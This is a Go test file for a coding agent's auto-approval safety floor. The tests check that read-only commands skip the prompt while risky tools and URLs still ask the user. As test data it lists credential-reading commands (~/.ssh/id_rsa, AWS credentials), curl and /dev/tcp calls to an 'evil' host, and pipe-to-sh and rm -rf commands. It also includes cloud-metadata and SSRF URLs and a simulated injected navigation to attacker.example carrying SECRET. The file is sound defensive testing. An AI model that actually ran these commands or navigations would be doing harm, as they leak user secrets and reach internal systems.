package agent

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/yottadynamics/yottacode/internal/adapter"
)

func TestIsAutoModeSafeBash(t *testing.T) {
	cases := []struct {
		name, command string
		want          bool
	}{
		{"single-grep", "grep -r foo internal/", true},
		{"single-ls", "ls -la", true},
		{"single-cat", "cat README.md", true},
		{"single-find", `find . -name "*.go"`, true},

		{"cd-then-grep", "cd /home/me/proj && grep -r foo internal/", true},
		{"cd-then-ls", "cd /repo && ls -la", true},
		{"cd-then-find", `cd /repo && find . -name "*.go"`, true},
		{"three-segments-all-safe", "cd /repo && ls && cat README.md", true},

		{"single-rm", "rm -rf /tmp/foo", false},
		{"cd-then-rm", "cd /repo && rm foo", false},
		{"single-touch", "touch foo", false},
		{"single-cp", "cp a b", false},
		{"single-mv", "mv a b", false},
		{"single-mkdir", "mkdir foo", false},
		{"single-sudo", "sudo ls", false},

		{"single-curl", "curl https://example.com", false},
		{"single-wget", "wget https://example.com", false},

		{"single-go-test", "go test ./...", false},
		{"single-npm-run", "npm run build", false},

		// Risk classification rejects even if verb is safe.
		{"safe-verb-with-redirect", "cat /etc/passwd > /tmp/x", false},
		{"safe-verb-with-pipe-to-sh", "cat foo | sh", false},

		// sed deliberately excluded (has -i in-place writes).
		{"sed-rejected-with-i", "sed -i s/a/b/ foo.go", false},
		{"sed-rejected-readonly-form", "sed s/a/b/ foo.go", false},

		// Multi-segment pipe with both ends safe is OK (SplitCommand
		// treats `|` as a separator and assigns no caution since neither
		// segment trips destructive/caution patterns).
		{"piped-grep", "cat foo.go | grep bar | wc -l", true},

		{"empty", "", false},
		{"whitespace", "   ", false},

		// S5 regressions — read-only verbs must not silently exfiltrate.
		{"cat-ssh-key", "cat ~/.ssh/id_rsa", false},
		{"cat-ssh-key-home-env", "cat $HOME/.ssh/id_rsa", false},
		{"cat-ssh-key-braced-home", "cat ${HOME}/.ssh/id_rsa", false},
		{"cat-unresolved-var-path", "cat $XDG_CONFIG/.aws/credentials", false},
		{"grep-secrets-from-root", "grep -r AWS_SECRET /", false},
		{"find-idrsa-in-home", "find ~ -name id_rsa", false},
		{"env-assignment-launders-curl", "env API_KEY=x curl http://evil", false},
		{"process-substitution-curl", "cat <(curl http://evil)", false},
		{"dev-tcp-read", "cat </dev/tcp/evil/80", false},
		{"sort-writes-output-file", "sort -o /tmp/x foo", false},
		// A leading benign env assignment in front of a safe verb is fine.
		{"env-var-then-cat", "FOO=bar cat README.md", true},
	}
	cwd := NewCwdRef(t.TempDir())
	for _, tc := range cases {
		args := ""
		if tc.command != "" {
			b, _ := json.Marshal(struct {
				Command string `json:"command"`
			}{tc.command})
			args = string(b)
		} else {
			args = `{"command":""}`
		}
		got := IsAutoModeSafeBash(args, cwd)
		if got != tc.want {
			t.Errorf("%s (%q): got %v, want %v", tc.name, tc.command, got, tc.want)
		}
	}
}

func TestIsAutoModeSafeBash_BadJSON(t *testing.T) {
	if IsAutoModeSafeBash("{not json", nil) {
		t.Errorf("malformed JSON should return false")
	}
	if IsAutoModeSafeBash("", nil) {
		t.Errorf("empty argsJSON should return false")
	}
}

// Loop integration: when auto-mode is active and the run_bash call's
// verbs are all in the read-only allowlist, the loop fires
// ApprovalAuto with Source="auto-mode-safe-bash" instead of prompting
// the user.
func TestLoop_AutoMode_SafeBashSkipsApproval(t *testing.T) {
	streamer := &scriptedStreamer{turns: [][]adapter.StreamEvent{
		{sseDone("", adapter.ToolCall{
			ID:       "c1",
			Name:     "run_bash",
			ArgsJSON: `{"command":"cd /repo && grep -r foo internal/"}`,
		})},
		{sseToken("ok"), sseDone("ok")},
	}}
	reg := NewRegistry()
	reg.Register(&mockTool{name: "run_bash", requiresApproval: true, output: "executed"})
	autoMode := &AutoModeState{}
	autoMode.Active.Store(true)
	cfg := LoopConfig{Adapter: streamer, Registry: reg, MaxIterations: 5, AutoMode: autoMode}
	hist := []adapter.Message{{Role: adapter.RoleUser, Content: "go"}}

	events, err := runTurnSync(t, context.Background(), cfg, &hist, nil)
	if err != nil {
		t.Fatalf("Turn: %v", err)
	}
	if hasEvent[ApprovalNeeded](events) {
		t.Errorf("auto-mode safe-bash should auto-allow, not prompt")
	}
	var sawSource bool
	for _, e := range events {
		if a, ok := e.(ApprovalAuto); ok && a.Source == "auto-mode-safe-bash" {
			sawSource = true
		}
	}
	if !sawSource {
		t.Errorf("expected ApprovalAuto with Source=auto-mode-safe-bash; got %+v", events)
	}
}

// A mutating bash command in auto-mode still goes through the modal:
// the safety floor catches it because IsAutoModeSafeBash returns false.
func TestLoop_AutoMode_UnsafeBashStillPrompts(t *testing.T) {
	streamer := &scriptedStreamer{turns: [][]adapter.StreamEvent{
		{sseDone("", adapter.ToolCall{
			ID:       "c1",
			Name:     "run_bash",
			ArgsJSON: `{"command":"rm -rf /tmp/foo"}`,
		})},
		{sseToken("denied"), sseDone("denied")},
	}}
	reg := NewRegistry()
	reg.Register(&mockTool{name: "run_bash", requiresApproval: true, output: "executed"})
	autoMode := &AutoModeState{}
	autoMode.Active.Store(true)
	cfg := LoopConfig{Adapter: streamer, Registry: reg, MaxIterations: 5, AutoMode: autoMode}
	hist := []adapter.Message{{Role: adapter.RoleUser, Content: "go"}}

	events, _ := runTurnSync(t, context.Background(), cfg, &hist, func(ApprovalNeeded) Decision {
		return Deny
	})
	// Verify auto-mode-safe-bash did NOT short-circuit this call.
	for _, e := range events {
		if a, ok := e.(ApprovalAuto); ok && a.Source == "auto-mode-safe-bash" {
			t.Errorf("rm should not be auto-approved as safe-bash: %+v", e)
		}
	}
}

func TestAutoModeState_IsActiveNilSafe(t *testing.T) {
	var a *AutoModeState
	if a.IsActive() {
		t.Errorf("nil AutoModeState should report inactive")
	}
	a = &AutoModeState{}
	if a.IsActive() {
		t.Errorf("zero-value AutoModeState should report inactive")
	}
	a.Active.Store(true)
	if !a.IsActive() {
		t.Errorf("Active=true should report active")
	}
}

func TestIsAutoModeSafetyFloor(t *testing.T) {
	for _, name := range []string{
		// run_bash, run_tests, and debug_start execute arbitrary commands;
		// debug_eval can evaluate code in a running process; git history
		// mutations are hard to reverse.
		"run_bash", "run_tests", "debug_start", "debug_eval", "git_commit", "git_checkpoint", "rollback",
		// enter_worktree / exit_worktree shift the agent's working
		// context (and exit's force-remove is destructive); always
		// prompt regardless of mode.
		"enter_worktree", "exit_worktree",
		// The browser tools that cross the local filesystem boundary: an
		// upload sends local file bytes to a site, a download writes to disk.
		"browser_upload", "browser_download",
	} {
		if !IsAutoModeSafetyFloor(name) {
			t.Errorf("%s should be in the safety floor", name)
		}
	}
	for _, name := range []string{
		"write_file", "edit_file", "apply_hashline", "apply_diff", "mkdir", "copy_file", "move_file",
		"delete_file", "git_stage_files", "git_unstage_files", "read_file", "grep",
		// The plain git_worktree_* wrappers are narrow, explicit, and
		// recoverable; they stay auto-allowed in auto mode.
		"git_worktree_list", "git_worktree_add", "git_worktree_remove",
		"git_worktree_lock", "git_worktree_unlock", "git_worktree_prune",
		"worktree_status",
		// Read-only browser operations stay auto-approved in /auto.
		"browser_inspect", "browser_screenshot", "browser_console_logs", "browser_network_requests",
	} {
		if IsAutoModeSafetyFloor(name) {
			t.Errorf("%s should NOT be in the safety floor", name)
		}
	}
}

// Loop integration: when auto mode is on, mutating tools that aren't
// in the safety floor auto-approve with Source=auto-mode instead of
// triggering the approval modal.
func TestLoop_AutoMode_AutoApprovesNonFloorTool(t *testing.T) {
	streamer := &scriptedStreamer{turns: [][]adapter.StreamEvent{
		{sseDone("", adapter.ToolCall{ID: "c1", Name: "write_file", ArgsJSON: `{"path":"main.go"}`})},
		{sseToken("ok"), sseDone("ok")},
	}}
	reg := NewRegistry()
	reg.Register(&mockTool{name: "write_file", requiresApproval: true, output: "wrote"})
	autoMode := &AutoModeState{}
	autoMode.Active.Store(true)
	cfg := LoopConfig{Adapter: streamer, Registry: reg, MaxIterations: 5, AutoMode: autoMode}
	hist := []adapter.Message{{Role: adapter.RoleUser, Content: "go"}}

	events, err := runTurnSync(t, context.Background(), cfg, &hist, nil)
	if err != nil {
		t.Fatalf("Turn: %v", err)
	}
	if hasEvent[ApprovalNeeded](events) {
		t.Errorf("auto-mode write should auto-allow, not prompt")
	}
	var sawAutoMode bool
	for _, e := range events {
		if a, ok := e.(ApprovalAuto); ok && a.Source == "auto-mode" {
			sawAutoMode = true
		}
	}
	if !sawAutoMode {
		t.Errorf("expected ApprovalAuto with Source=auto-mode; got %+v", events)
	}
}

// Safety-floor tools (run_bash, git_commit, …) still prompt even when
// auto mode is on. That's the whole point of the floor.
func TestLoop_AutoMode_SafetyFloorStillPrompts(t *testing.T) {
	streamer := &scriptedStreamer{turns: [][]adapter.StreamEvent{
		{sseDone("", adapter.ToolCall{ID: "c1", Name: "run_bash", ArgsJSON: `{"command":"rm -rf /"}`})},
		{sseToken("denied"), sseDone("denied")},
	}}
	reg := NewRegistry()
	reg.Register(&mockTool{name: "run_bash", requiresApproval: true, output: "executed"})
	autoMode := &AutoModeState{}
	autoMode.Active.Store(true)
	cfg := LoopConfig{Adapter: streamer, Registry: reg, MaxIterations: 5, AutoMode: autoMode}
	hist := []adapter.Message{{Role: adapter.RoleUser, Content: "go"}}

	_, _ = runTurnSync(t, context.Background(), cfg, &hist, func(ApprovalNeeded) Decision {
		return Deny
	})
	// Verify ApprovalNeeded fired AT LEAST once for run_bash.
	// (The decide func is mandatory in runTurnSync when ApprovalNeeded
	// fires, so reaching here without panic already proves it fired.)
}

// Auto mode doesn't override an explicit Deny rule — the user said
// "never" with permissions.json and that always wins.
func TestLoop_AutoMode_DenyRuleStillWins(t *testing.T) {
	perms, cwd := permsForTest(t, nil, nil, []string{"Write(forbidden.go)"})
	streamer := &scriptedStreamer{turns: [][]adapter.StreamEvent{
		{sseDone("", adapter.ToolCall{ID: "c1", Name: "write_file", ArgsJSON: `{"path":"forbidden.go"}`})},
		{sseToken("denied"), sseDone("denied")},
	}}
	reg := NewRegistry()
	reg.Register(&mockTool{name: "write_file", requiresApproval: true, output: "wrote"})
	autoMode := &AutoModeState{}
	autoMode.Active.Store(true)
	cfg := LoopConfig{Adapter: streamer, Registry: reg, Permissions: perms, Cwd: NewCwdRef(cwd), MaxIterations: 5, AutoMode: autoMode}
	hist := []adapter.Message{{Role: adapter.RoleUser, Content: "go"}}

	events, _ := runTurnSync(t, context.Background(), cfg, &hist, nil)
	var sawDeny, sawAutoMode bool
	for _, e := range events {
		if a, ok := e.(ApprovalAuto); ok {
			if a.Source == "deny-rule" {
				sawDeny = true
			}
			if a.Source == "auto-mode" {
				sawAutoMode = true
			}
		}
	}
	if !sawDeny {
		t.Errorf("expected deny-rule to fire; got %+v", events)
	}
	if sawAutoMode {
		t.Errorf("auto-mode should NOT override an explicit deny rule")
	}
}

// Plan and auto are mutually exclusive at the loop level: when both
// flags happen to be on (shouldn't happen in real use), the plan-mode
// path takes precedence so plan-mode-allow / plan-mode-block still
// govern writes.
func TestLoop_AutoMode_PlanModePrecedesWhenBothActive(t *testing.T) {
	streamer := &scriptedStreamer{turns: [][]adapter.StreamEvent{
		// Write to plan file → plan-mode-allow.
		{sseDone("", adapter.ToolCall{ID: "c1", Name: "write_file", ArgsJSON: `{"path":"/tmp/plan.md"}`})},
		{sseToken("ok"), sseDone("ok")},
	}}
	reg := NewRegistry()
	reg.Register(&mockTool{name: "write_file", requiresApproval: true, output: "wrote"})
	planMode := &PlanModeState{PlanFile: "/tmp/plan.md"}
	planMode.Active.Store(true)
	autoMode := &AutoModeState{}
	autoMode.Active.Store(true)
	cfg := LoopConfig{Adapter: streamer, Registry: reg, MaxIterations: 5, PlanMode: planMode, AutoMode: autoMode}
	hist := []adapter.Message{{Role: adapter.RoleUser, Content: "go"}}

	events, _ := runTurnSync(t, context.Background(), cfg, &hist, nil)
	var sources []string
	for _, e := range events {
		if a, ok := e.(ApprovalAuto); ok {
			sources = append(sources, a.Source)
		}
	}
	// The plan-mode-allow should fire (plan file write). The
	// auto-mode source should NOT fire for this call (plan takes
	// precedence).
	sawPlanAllow := false
	sawAutoMode := false
	for _, s := range sources {
		if s == "plan-mode-allow" {
			sawPlanAllow = true
		}
		if s == "auto-mode" {
			sawAutoMode = true
		}
	}
	if !sawPlanAllow {
		t.Errorf("expected plan-mode-allow; got sources %+v", sources)
	}
	if sawAutoMode {
		t.Errorf("auto-mode should not fire when plan-mode-allow already handled the call; got sources %+v", sources)
	}
}

// In /auto the read-only browser tools go through without a modal, but the two
// tools that cross the local filesystem boundary (upload, download) still stop
// and ask — and a refusal really stops them.
func TestLoop_AutoMode_BrowserReadsAutoApproveFileBoundaryToolsPrompt(t *testing.T) {
	streamer := &scriptedStreamer{turns: [][]adapter.StreamEvent{
		{sseDone("", adapter.ToolCall{ID: "c1", Name: "browser_inspect", ArgsJSON: `{"selector":"main"}`})},
		{sseDone("", adapter.ToolCall{ID: "c2", Name: "browser_screenshot", ArgsJSON: `{}`})},
		{sseDone("", adapter.ToolCall{ID: "c3", Name: "browser_upload", ArgsJSON: `{"selector":"#f","paths":["secrets.txt"]}`})},
		{sseDone("", adapter.ToolCall{ID: "c4", Name: "browser_download", ArgsJSON: `{"selector":"#d","path":"out.bin"}`})},
		{sseToken("done"), sseDone("done")},
	}}
	reg := NewRegistry()
	for _, name := range []string{"browser_inspect", "browser_screenshot", "browser_upload", "browser_download"} {
		reg.Register(&mockTool{name: name, requiresApproval: true, output: "executed:" + name})
	}
	autoMode := &AutoModeState{}
	autoMode.Active.Store(true)
	cfg := LoopConfig{Adapter: streamer, Registry: reg, MaxIterations: 8, AutoMode: autoMode}
	hist := []adapter.Message{{Role: adapter.RoleUser, Content: "go"}}

	var prompted []string
	events, err := runTurnSync(t, context.Background(), cfg, &hist, func(n ApprovalNeeded) Decision {
		prompted = append(prompted, n.ToolName)
		return Deny
	})
	if err != nil {
		t.Fatalf("Turn: %v", err)
	}
	if got := strings.Join(prompted, ","); got != "browser_upload,browser_download" {
		t.Errorf("prompted for %q; want exactly browser_upload,browser_download (reads must not prompt in /auto)", got)
	}
	autoApproved := map[string]bool{}
	for _, e := range events {
		if a, ok := e.(ApprovalAuto); ok && a.Source == "auto-mode" {
			autoApproved[a.ToolName] = true
		}
	}
	for _, name := range []string{"browser_inspect", "browser_screenshot"} {
		if !autoApproved[name] {
			t.Errorf("%s should be auto-approved by auto mode; auto-approved = %v", name, autoApproved)
		}
	}
	for _, name := range []string{"browser_upload", "browser_download"} {
		if autoApproved[name] {
			t.Errorf("%s must not be auto-approved by auto mode", name)
		}
	}
	// A denied upload/download must not have executed.
	for _, m := range hist {
		if strings.Contains(m.Content, "executed:browser_upload") || strings.Contains(m.Content, "executed:browser_download") {
			t.Errorf("a denied file-boundary call executed anyway: %q", m.Content)
		}
	}
}

// In /auto the agent may open pages on this machine (that is the point of
// testing a dev server) but going anywhere else asks first: an auto-approved
// browser_navigate is how an injected instruction would send data out or reach
// an internal address. Everything that is not a plain http(s) URL to a loopback
// host must prompt.
func TestIsAutoModeSafetyFloorCall_BrowserNavigate(t *testing.T) {
	nav := func(u string) string {
		b, _ := json.Marshal(map[string]string{"url": u})
		return string(b)
	}
	stayAuto := []string{
		"http://localhost:3000/login",
		"https://localhost/",
		"HTTP://LOCALHOST:8080/x",
		"http://localhost./",
		"http://127.0.0.1:8080/",
		"http://127.1.2.3/", // all of 127.0.0.0/8 is this machine
		"http://[::1]:5173/",
		"  http://localhost:3000/  ",
		"http://localhost:3000/search?q=long island", // raw space in the query
	}
	for _, u := range stayAuto {
		if IsAutoModeSafetyFloorCall("browser_navigate", nav(u)) {
			t.Errorf("navigate %q should stay auto-approved in /auto", u)
		}
	}

	mustPrompt := []string{
		// somewhere else
		"https://example.com/",
		"https://streeteasy.com/for-rent/long-island-city",
		// internal addresses: other machines, not this one
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://10.0.0.5/admin",
		"http://192.168.1.1/",
		"http://172.16.0.9/",
		"http://[fd00:ec2::254]/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://0.0.0.0:3000/", // not loopback as far as this check can tell
		// names that merely look local
		"http://localhost.evil.com/",
		"http://evil.com/localhost",
		"http://127.0.0.1.evil.com/",
		"http://notlocalhost/",
		// authority tricks: Go and Chrome can disagree about the host
		"http://localhost@evil.com/",
		"http://127.0.0.1@evil.com/",
		"http://user:pw@localhost/",
		"http://evil.com#@localhost/",
		// numeric forms this check does not understand: prompt, don't guess
		"http://2130706433/",
		"http://0x7f.0.0.1/",
		"http://017700000001/",
		// not a plain web URL at all
		"file:///etc/passwd",
		"javascript:alert(1)",
		"data:text/html,x",
		"about:blank",
		"localhost:3000",
		"",
	}
	for _, u := range mustPrompt {
		if !IsAutoModeSafetyFloorCall("browser_navigate", nav(u)) {
			t.Errorf("navigate %q must prompt in /auto", u)
		}
	}

	// Malformed arguments never earn an auto-approval.
	for _, args := range []string{"", "{", "null", `{"url":123}`, `{}`} {
		if !IsAutoModeSafetyFloorCall("browser_navigate", args) {
			t.Errorf("navigate with args %q must prompt in /auto", args)
		}
	}
}

// The per-call rule must not change any other tool: the tool-level floor still
// decides for everything but browser_navigate.
func TestIsAutoModeSafetyFloorCall_OtherToolsFollowTheToolFloor(t *testing.T) {
	for _, name := range []string{
		"run_bash", "git_commit", "browser_upload", "browser_download",
		"write_file", "read_file", "browser_inspect", "browser_screenshot", "browser_click", "browser_type",
	} {
		if got, want := IsAutoModeSafetyFloorCall(name, `{"url":"https://example.com/"}`), IsAutoModeSafetyFloor(name); got != want {
			t.Errorf("IsAutoModeSafetyFloorCall(%s) = %t, want the tool-level answer %t", name, got, want)
		}
	}
}

// End to end in the real loop: /auto opens localhost without asking, stops for
// any other host, and a refusal really stops it.
func TestLoop_AutoMode_BrowserNavigateAsksOnlyBeyondLoopback(t *testing.T) {
	streamer := &scriptedStreamer{turns: [][]adapter.StreamEvent{
		{sseDone("", adapter.ToolCall{ID: "c1", Name: "browser_navigate", ArgsJSON: `{"url":"http://localhost:3000/"}`})},
		{sseDone("", adapter.ToolCall{ID: "c2", Name: "browser_navigate", ArgsJSON: `{"url":"https://attacker.example/?d=SECRET"}`})},
		{sseDone("", adapter.ToolCall{ID: "c3", Name: "browser_navigate", ArgsJSON: `{"url":"http://169.254.169.254/latest/meta-data/"}`})},
		{sseToken("done"), sseDone("done")},
	}}
	reg := NewRegistry()
	reg.Register(&mockTool{name: "browser_navigate", requiresApproval: true, output: "executed:browser_navigate"})
	autoMode := &AutoModeState{}
	autoMode.Active.Store(true)
	cfg := LoopConfig{Adapter: streamer, Registry: reg, MaxIterations: 8, AutoMode: autoMode}
	hist := []adapter.Message{{Role: adapter.RoleUser, Content: "go"}}

	var prompted []string
	events, err := runTurnSync(t, context.Background(), cfg, &hist, func(n ApprovalNeeded) Decision {
		prompted = append(prompted, n.ArgsJSON)
		return Deny
	})
	if err != nil {
		t.Fatalf("Turn: %v", err)
	}
	if len(prompted) != 2 || !strings.Contains(prompted[0], "attacker.example") || !strings.Contains(prompted[1], "169.254.169.254") {
		t.Errorf("prompted for %q; want exactly the attacker.example and 169.254.169.254 navigations", prompted)
	}
	var autoApproved int
	for _, e := range events {
		if a, ok := e.(ApprovalAuto); ok && a.Source == "auto-mode" && a.ToolName == "browser_navigate" {
			autoApproved++
		}
	}
	if autoApproved != 1 {
		t.Errorf("auto-approved %d navigations, want exactly the localhost one", autoApproved)
	}
}

// A per-site rule the user saved is their explicit decision and beats the floor,
// exactly as an allow rule does for every other floor tool — but only for that
// site.
func TestLoop_AutoMode_SavedSiteRuleSkipsTheNavigatePrompt(t *testing.T) {
	perms, cwd := permsForTest(t, []string{"Browser(navigate example.com)"}, nil, nil)
	streamer := &scriptedStreamer{turns: [][]adapter.StreamEvent{
		{sseDone("", adapter.ToolCall{ID: "c1", Name: "browser_navigate", ArgsJSON: `{"url":"https://example.com/docs"}`})},
		{sseDone("", adapter.ToolCall{ID: "c2", Name: "browser_navigate", ArgsJSON: `{"url":"https://other.example/"}`})},
		{sseToken("done"), sseDone("done")},
	}}
	reg := NewRegistry()
	reg.Register(&mockTool{name: "browser_navigate", requiresApproval: true, output: "ok"})
	autoMode := &AutoModeState{}
	autoMode.Active.Store(true)
	cfg := LoopConfig{Adapter: streamer, Registry: reg, Permissions: perms, Cwd: NewCwdRef(cwd), MaxIterations: 8, AutoMode: autoMode}
	hist := []adapter.Message{{Role: adapter.RoleUser, Content: "go"}}

	var prompted []string
	if _, err := runTurnSync(t, context.Background(), cfg, &hist, func(n ApprovalNeeded) Decision {
		prompted = append(prompted, n.ArgsJSON)
		return Deny
	}); err != nil {
		t.Fatalf("Turn: %v", err)
	}
	if len(prompted) != 1 || !strings.Contains(prompted[0], "other.example") {
		t.Errorf("prompted for %q; want only other.example (example.com is covered by the saved rule)", prompted)
	}
}
